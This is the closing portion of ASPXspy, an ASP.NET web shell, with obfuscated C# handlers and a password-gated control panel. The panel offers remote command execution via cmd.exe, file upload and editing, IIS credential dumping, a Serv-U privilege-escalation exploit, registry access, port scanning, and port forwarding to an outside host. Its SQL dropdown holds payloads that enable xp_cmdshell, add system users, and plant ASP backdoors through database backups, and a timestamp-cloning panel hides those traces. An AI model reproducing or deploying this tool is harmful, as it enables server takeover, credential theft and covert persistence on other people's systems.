protected void qJkW(object sender,EventArgs e)
{
jbT();
}
protected void NeTA(object sender,EventArgs e)
{
TKYCx();
}
protected void MKMa(object sender,EventArgs e)
{
EkDgp();
}
protected void Dzd(object sender,EventArgs e)
{
czPT();
}
protected void JNFB(object sender,EventArgs e)
{
FJyUd();
}
protected void tzYWv(object sender,EventArgs e)
{
HzD();
}
protected void ZyX(object sender,EventArgs e)
{
switch(((Control)sender).ID.ToString())
{
case "yxcP":
yaDo.Visible=false;
ptuW.Text=yxcP.SelectedItem.Value.ToString();
break;
case "ObVj":
case "Qnq":
fZKGP();
break;
case "rPLN":
YOKv.InnerText=rPLN.SelectedItem.Value.ToString();
break;
case "qtw":
eYl(wuBA.Value);
break;
}
}
protected void Tec(object sender,EventArgs e)
{
jWR(SLfr.Value);
}
protected void Jmg(object sender,EventArgs e)
{
PuJaR();
}
protected void dSbu(object sender,EventArgs e)
{
gsU();
}
protected void AqeP(object sender,EventArgs e)
{
sZpf();
}
protected void rhH(object sender,EventArgs e)
{
vcyAs();
NxO("Clear All Thread ......");
}
protected void lOjP(object sender,EventArgs e)
{
if(cNc.Value=="" || kfr.Value.Length<7 || DcH.Value=="")return;
NfM();
NxO("All Thread Start ......");
}
protected void wgwO(object sender,EventArgs e)
{
}
protected void emnB(object sender,EventArgs e)
{
mepF();
Nwd.Visible=true;
string res=string.Empty;
foreach(ScanPort th in kVaC)
{
res+=th.ip+" : "+th.port+" ................................. "+th.status+"<br>";
}
Nwd.InnerHtml=res;
}
protected void oLQ(object sender,EventArgs e)
{
MGze.Visible=true;
igMz();
}
protected void pft(object sender,EventArgs e)
{
string Lhkxk="";
try
{
FcS();
DataTable[] jSqnK=Bin_Data(YOKv.InnerText);
string aXKRQ="Query.xls";
Match mat=Regex.Match(YOKv.InnerText,@"(?<= from \[?)[\w.]+");
if (mat.Success)
{
aXKRQ=mat.Value+".xls";
}
if (jSqnK!=null&&jSqnK.Length>0)
{
Response.AddHeader("Content-Disposition","attachment;filename="+aXKRQ);
Response.ContentType="application / ms - excel";
foreach(DataTable subtable in jSqnK)
{
Response.Write("<table border=1><tr>\r\n");
foreach(DataColumn subcol in subtable.Columns)
{
Response.Write("<td><b>"+subcol.ColumnName+"</b></td>");
}
Response.Write("</tr>");
foreach(DataRow subrow in subtable.Rows)
{
Response.Write("<tr>");
for (int i=0;i<subrow.ItemArray.Length;i++)
{
Response.Write("<td>"+subrow.ItemArray[i].ToString()+"</td>");
}
Response.Write("</tr>");
}
Response.Write("</table>\r\n");
}
}
}
catch (Exception ex)
{
}
Response.End();
}
public void Tij()
{
jwBFX.Visible=false;
LBXA.Visible=false;
Ixlp.Visible=false;
oZNc.Visible=false;
qEMR.Visible=false;
miYnm.Visible=false;
saE.Visible=false;
MiGuK.Visible=false;
GKMQ.Visible=false;
TSVl.Visible=false;
}
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>ASPXspy</title>
<style type="text/css">
.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
.list{font:12px Arial,Tahoma;height:23px;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
</style>
<script type="text/javascript">
function CheckAll(form){
for(var i=0;i<form.elements.length;i++){
var e=form.elements[i];
if(e.name!='chkall')
e.checked=form.chkall.checked;
}
}
</script>
</head>
<body style="margin:0;table-layout:fixed;">
<form id="ASPXSpy" runat="server">
<div id="Vrro" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
<span style="font:11px Verdana;">Password:</span>
<asp:TextBox ID="WUm" runat="server" CssClass="Bin_Style_Login" ></asp:TextBox>
<asp:Button ID="zTeo" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="vASke"/>
</div>
<div id="cpuP" runat="server">
<div id="PkoF" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"><a href="http://www.rootkit.net.cn" target="_blank">ASPXSpy Ver: 2008</a></span><span id="dGrI" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
<td><span style="float:right;" id="xXTc" runat="server"></span>
<asp:LinkButton ID="UTj" runat="server" OnClick="qtB" Text="Logout" ></asp:LinkButton> | <asp:LinkButton ID="osFpV" runat="server" Text="File Manager" OnClick="wkn"></asp:LinkButton> | <asp:LinkButton ID="BeoB" runat="server" Text="CmdShell" OnClick="ERlO"></asp:LinkButton> | <asp:LinkButton ID="JYd" runat="server" Text="IIS Spy" OnClick="Ypkbj"></asp:LinkButton> | <asp:LinkButton ID="xwt" runat="server" Text="Process" OnClick="YDG"></asp:LinkButton> | <asp:LinkButton ID="fucm" runat="server" Text="Services" OnClick="QYNA"></asp:LinkButton> | <asp:LinkButton ID="nnIrU" runat="server" Text="UserInfo" OnClick="NeTA"></asp:LinkButton> | <asp:LinkButton ID="AbY" runat="server" Text="SysInfo" OnClick="qJkW"></asp:LinkButton> | <asp:LinkButton ID="rZtXY" runat="server" Text="FileSearch" OnClick="xQmOO"></asp:LinkButton> | <asp:LinkButton ID="YxZsr" runat="server" Text="SU Exp" OnClick="MKMa"></asp:LinkButton> | <asp:LinkButton ID="SOsfq" runat="server" Text="RegShell" OnClick="JNFB"></asp:LinkButton> | <asp:LinkButton ID="qDg" runat="server" Text="PortScan" OnClick="dSbu" ></asp:LinkButton> | <asp:LinkButton ID="lAln" runat="server" Text="DataBase" OnClick="tzYWv"></asp:LinkButton> | <asp:LinkButton ID="aLMT" runat="server" Text="PortMap" OnClick="AqeP"></asp:LinkButton>
</td>
</tr>
</table>
</div>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<div id="yKfx" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"></div>
<h2 id="BAv" runat="server"></h2>
<%--FileList--%>
<div id="LBXA" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 <tr>
<td style=" white-space:nowrap">Current Directory : </td>
<td style=" width:100%"><input class="input" id="SLfr" type="text" style="width:97%;margin:0 8px;" runat="server"/>
</td>
<td style="white-space:nowrap" ><asp:Button ID="ssTD" runat="server" Text="Go" CssClass="bt" OnClick="VwKE"/></td>
 </tr>
</table>
<table width="100%" border="0" cellpadding="4" cellspacing="0">
<tr class="alt1"><td colspan="7" style="padding:5px;">
<div style="float:right;"><input id="GVIv" class="input" runat="server" type="file" style=" height:22px"/>
<asp:Button ID="ZZDn" CssClass="bt" runat="server" Text="Upload" OnClick="JFpm"/></div><asp:LinkButton ID="YPDD" runat="server" Text="WebRoot" OnClick="QErPn"></asp:LinkButton> | <a href="#" id="HtE" runat="server">Create Directory</a> | <a href="#" id="HbIQ" runat="server">Create File</a>
 | <span id="NljI" runat="server"></span><a href="#" id="ppHmW" runat="server" style="color:Red">Kill Me</a>
</td></tr>
<asp:Table ID="fLaRz" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>Filename</asp:TableCell><asp:TableCell Width="25%">Last modified</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">Action</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--FileEdit--%>
<div id="GKMQ" runat="server">
<p>Current File(import new file name and new file)<br/>
<input class="input" id="wuBA" type="text" size="100" runat="server"/> <asp:DropDownList ID="qtw" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="ZyX"><asp:ListItem>Default</asp:ListItem><asp:ListItem>UTF-8</asp:ListItem></asp:DropDownList>
</p>
<p>File Content<br/>
<textarea id="tFp" runat="server" class="area" cols="100" rows="25" enableviewstate="true" ></textarea>
</p>
<p><asp:Button ID="yov" runat="server" Text="Submit" CssClass="bt" OnClick="CLClp"/> <asp:Button ID="vJys" runat="server" Text="Back" CssClass="bt" OnClick="Tec"/></p>
</div>
<%--CloneTime--%>
<div id="Gvo" runat="server" enableviewstate="false" visible="false">
<p>Alter file<br/><input class="input" id="XhKp" type="text" size="120" runat="server"/></p>
<p>Reference file(fullpath)<br/><input class="input" id="sFHT" type="text" size="120" runat="server"/></p>
<p><asp:Button ID="XodS" runat="server" Text="Submit" CssClass="bt" OnClick="KuKWS"/></p>
<h2>Set last modified &raquo;</h2>
<p>Current file(fullpath)<br/><input class="input" id="ccKmv" type="text" size="120" runat="server"/></p>
<p>
<asp:CheckBox ID="eyc" runat="server" Text="ReadOnly" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="pFP" runat="server" Text="System" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="FeH" runat="server" Text="Hidden" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="ldVI" runat="server" Text="Archive" EnableViewState="False"/>
</p>
<p>
CreationTime :
<input class="input" id="VQcc" type="text" runat="server"/>
LastWriteTime :
<input class="input" id="qoH" type="text" runat="server"/>
LastAccessTime :
<input class="input" id="jzRQ" type="text" runat="server"/>
</p>
<p>
<asp:Button ID="RZQqL" CssClass="bt" runat="server" Text="Submit" OnClick="Bmsez"/>
</p>
</div>
<%--IISSpy--%>
<div runat="server" id="ADy" visible="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="JnJ" runat="server" Width="100%" CellSpacing="0">
<asp:TableRow CssClass="head"><asp:TableCell><asp:Button runat="server" id="jyKpT" CssClass="bt" onclick="YHT" Text="Export"/></asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--Process--%>
<div runat="server" id="jwBFX" visible="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="GNGqg" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>Priority</asp:TableCell><asp:TableCell>Action</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--CmdShell--%>
<div runat="server" id="oZNc">
 <p>CmdPath:<br/>
 <input class="input" runat="server" id="vUE" type="text" size="100" value="c:\windows\system32\cmd.exe"/>
 </p>
 Argument:<br/>
 <input class="input" runat="server" id="cYKl" value="/c Set" type="text" size="100"/> <asp:Button ID="htKM" CssClass="bt" runat="server" Text="Submit" OnClick="VobM"/>
 <div id="KEb" runat="server" visible="false" enableviewstate="false">
 </div>
</div>
<%--Services--%>
<div runat="server" id="Rce" visible ="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="nsOp" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Name</asp:TableCell><asp:TableCell>Path</asp:TableCell><asp:TableCell>State</asp:TableCell><asp:TableCell>StartMode</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--Sysinfo--%>
<div runat="server" id="GvsD" visible="false" enableviewstate="false">
<hr style=" border: 1px solid #ddd;height:0px;"/>
<ul class="info" id="wdyr" runat="server"></ul>
<h2 id="UCXm" runat="server"></h2>
<hr style=" border: 1px solid #ddd;height:0px;"/>
<ul class="info" id ="Bin_Ul_NetConfig" runat="server"></ul>
<h2 id="Dbxd" runat="server"></h2>
<hr style=" border: 1px solid #ddd;height:0px;"/>
<ul class="info" id ="Bin_Ul_Driver" runat="server"></ul>
</div>
<%--UserInfo--%>
<div runat="server" id="PsF" visible="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="oXp" runat="server" Width="100%" CellSpacing="0" >
</asp:Table>
</table>
</div>
<%--SuExp--%>
 <div runat="server" id="Ixlp">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 <tr align="center">
 <td style="width:10%"></td>
 <td style="width:20%" align="left">UserName : <input class="input" runat="server" id="Kny" type="text" size="20" value="localadministrator"/></td>
 <td style="width:20%" align="left">PassWord : <input class="input" runat="server" id="LAr" type="text" size="20" value="#l@$ak#.lk;0@P"/></td>
 <td style="width:20%" align="left">Port : <input class="input" runat="server" id="HgcZf" type="text" size="20" value="43958"/></td>
 <td style="width:10%"></td>
 </tr>
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="Pof" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="rSIg" CssClass="bt" runat="server" Text="Exploit" OnClick="Dzd"/></td>
 </tr>
</table>
<div id="LnqB" visible="false" enableviewstate="false" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:30%"></td>
<td align="left" style="width:40%"><pre id="hEf" runat="server"></pre></td>
<td style="width:30%"></td>
</tr>
</table>
</div>
</div>
<%--Reg--%>
<div id="qEMR" runat="server">
<p>Registry Path : <asp:TextBox id="Fipg" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="RJY" runat="server" Text="Go" CssClass="bt" onclick="UAX"/></p>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="bsr" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="alt1"><asp:TableCell ColumnSpan="2" id="oSt"></asp:TableCell></asp:TableRow>
<asp:TableRow CssClass="head"><asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">Value</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--PortScan--%>
<div id="miYnm" runat="server">
<p>
IP : <asp:TextBox id="ThIG" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> Port : <asp:TextBox id="pNY" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="CFg" runat="server" Text="Scan" CssClass="bt" OnClick="emnB"/>
</p>
<div id="Nwd" runat="server" visible="false" enableviewstate="false"></div>
</div>
<%--DataBase--%>
<div id="saE" runat="server">
<p>ConnString : <asp:TextBox id="ptuW" style="width:70%;margin:0 8px;" CssClass="input" runat="server"/><asp:DropDownList runat="server" CssClass="list" ID="yxcP" AutoPostBack="True" OnSelectedIndexChanged="ZyX" ><asp:ListItem></asp:ListItem><asp:ListItem Value="server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB">MSSQL</asp:ListItem><asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID="YCeW" runat="server" Text="Go" CssClass="bt" OnClick="Jmg"/></p>
<div id="yaDo" runat="server">
<div id="DSo" runat="server"></div>
<div id="TzvNe" runat="server">
Please select a database : <asp:DropDownList runat="server" ID="Qnq" AutoPostBack="True" OnSelectedIndexChanged="ZyX" CssClass="list"></asp:DropDownList>
SQLExec : <asp:DropDownList runat="server" ID="rPLN" AutoPostBack="True" OnSelectedIndexChanged="ZyX" CssClass="list"><asp:ListItem Value="">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')">Add xp_cmdshell</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')">Add sp_oacreate</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;">Add xp_cmdshell(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;">Add makewebtask(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'">XP_cmdshell exec</asp:ListItem><asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1">XP_dirtree</asp:ListItem><asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\bin.asp';">SP_oamethod exec</asp:ListItem><asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''">SP_makewebtask make file</asp:ListItem><asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')">SandBox</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];">LogBackup</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];">DatabaseBackup</asp:ListItem></asp:DropDownList> 
<asp:Button runat="server" ID="ObVj" CssClass="bt" Text="Show Tables" OnClick="ZyX"/>
</div>
<table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td> Run SQL </td></tr><tr><td><textarea id="YOKv" class="area" style="width:600px;height:60px;overflow:auto;" runat="server" rows="6" cols="1"></textarea></td></tr><tr><td>
<asp:Button runat="server" ID="Hky" CssClass="bt" Text="Query" onclick="oLQ"/> 
<asp:Button runat="server" ID="MGze" CssClass="bt" Text="Export" onclick="pft" Visible="false" EnableViewState="false"/></td></tr></table>
<div style="overflow:auto;width:950px" >
<p>
<asp:DataGrid runat="server" ID="kzgTa" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" ></asp:DataGrid>
</p>
</div>
</div>
</div>
<%--PortMap--%>
<div id="MiGuK" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:5%"></td>
<td style="width:20%" align="left">Local Ip : <input class="input" runat="server" id="kfr" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">Local Port : <input class="input" runat="server" id="cNc" type="text" size="20" value="3389"/></td>
<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="Pxtw" type="text" size="20" value="www.rootkit.net.cn"/></td>
<td style="width:20%" align="left">Remote Port : <input class="input" runat="server" id="DcH" type="text" size="20" value="80"/></td></tr>
<tr align="center"><td colspan="5"><br/><asp:Button ID="uam" CssClass="bt" runat="server" Text="MapPort" OnClick="lOjP"/> <asp:Button ID="iEc" CssClass="bt" runat="server" Text="ClearAll" OnClick="rhH"/> <asp:Button ID="zGFgF" CssClass="bt" runat="server" Text="Refresh" OnClick="wgwO"/></td></tr></table></div>
<%--Search--%>
<div id="TSVl" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:20%" align="left">Keyword</td>
<td style="width:60%" align="left"><textarea id="FTlA" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="rxRa" value="1"/> Use Regex</td>
</tr>
<tr align="center">
<td style="width:20%" align="left">Replace As</td>
<td style="width:60%" align="left"><textarea id="bPlYD" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="FZbH"/> Replace</td>
</tr>
<tr align="center">
<td style="width:20%" align="left">Search FileType</td>
<td style="width:60%" align="left"><input type="text" runat="server" class="input" id="Vpf" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/></td>
<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="jaDko" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name">File Name</asp:ListItem><asp:ListItem Value="content" Selected="True">File Content</asp:ListItem></asp:DropDownList></td>
</tr>
<tr align="center">
<td style="width:20%" align="left">Path</td>
<td style="width:60%" align="left"><input type="text" class="input" id="sPzI" runat="server" style="width:100%" /></td>
<td style="width:20%" align="left"><asp:Button CssClass="bt" id="xUlo" runat="server" onclick="KFh" Text="Start" /></td>
</tr>
</table>
<br/>
<br/>
<asp:Table ID="gAb" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
</asp:Table>
</div>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright(C)2006-2008 <a href="http://www.rootkit.net.cn" target="_blank">Bin'Blog</a> All Rights Reserved.</div></div>
</form>
</body>
</html>